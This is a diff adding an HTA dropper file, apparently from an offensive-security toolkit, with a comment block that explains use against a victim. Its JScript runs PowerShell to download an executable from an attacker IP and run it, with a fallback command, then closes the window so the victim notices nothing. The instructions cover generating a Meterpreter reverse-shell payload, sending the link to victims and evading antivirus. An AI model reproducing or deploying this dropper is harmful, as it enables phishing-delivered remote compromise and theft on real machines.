@@ -1,0 +1,82 @@
+<html>
+<!--
+============================================================
+HTA (HTML Application) Dropper
+============================================================
+WHAT THIS IS:
+  An HTML Application (.hta file) that runs as a trusted Windows
+  application via mshta.exe. Unlike regular HTML, HTAs have full
+  access to ActiveX objects including WScript.Shell.
+
+WHAT THIS DOES:
+  Uses WScript.Shell.Run() to execute PowerShell, which:
+    1. Downloads your payload binary from your Kali server
+    2. Saves it to C:\Users\Public\runner.exe (always writable)
+    3. Executes it
+
+HOW TO USE:
+  1. Generate payload:
+     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe -o runner.exe
+
+  2. Host payload and this HTA:
+     python3 -m http.server 80
+
+  3. Change IP addresses below to your Kali IP
+
+  4. Send link to victim: http://<KALI_IP>/clickme.hta
+     Or: email the file directly
+
+  5. Start Metasploit listener:
+     use exploit/multi/handler
+     set PAYLOAD windows/x64/meterpreter/reverse_tcp
+     set LHOST <IP>; set LPORT 443; run
+
+WHEN VICTIM OPENS:
+  - mshta.exe is invoked (trusted Windows binary)
+  - JScript in <head> fires immediately
+  - Shell.Run() executes two PS commands (iwr and wget as fallback)
+  - Window closes (self.close())
+
+NOTES:
+  - runner.exe on disk will likely be caught by Defender
+  - For AV evasion: use an encrypted loader instead (03-loaders/shellcode-runners/clrunner.cs)
+  - The self.close() hides the HTA window after running
+  - Two run commands = belt-and-suspenders for PS download methods
+============================================================
+-->
+<head>
+<script language="JScript">
+
+// Create a WScript.Shell object — allows running commands as the user
+var shell = new ActiveXObject("WScript.Shell");
+
+// Method 1: iwr (Invoke-WebRequest) — modern PS cmdlet
+// Downloads runner.exe from attacker and executes it
+// CHANGE: 172.21.23.10 → your Kali IP
+var res = shell.Run(
+    "powershell.exe iwr -uri http://172.21.23.10/inj_runner.exe " +
+    "-outfile C:\\users\\public\\runner.exe; " +
+    "C:\\users\\public\\runner.exe"
+);
+
+// Method 2: wget (PS alias for Invoke-WebRequest) — fallback
+// Same download/execute but using the wget alias (sometimes works differently)
+var ress = shell.Run(
+    "powershell.exe wget http://172.21.23.10/inj_runner.exe " +
+    "-o C:\\users\\public\\runner.exe; " +
+    "C:\\users\\public\\runner.exe"
+);
+
+</script>
+</head>
+<body>
+<script language="JScript">
+
+// Close the HTA window immediately after running the payload
+// This prevents the victim from seeing an empty window and
+// makes the execution appear as if nothing happened
+self.close();
+
+</script>
+</body>
+</html>
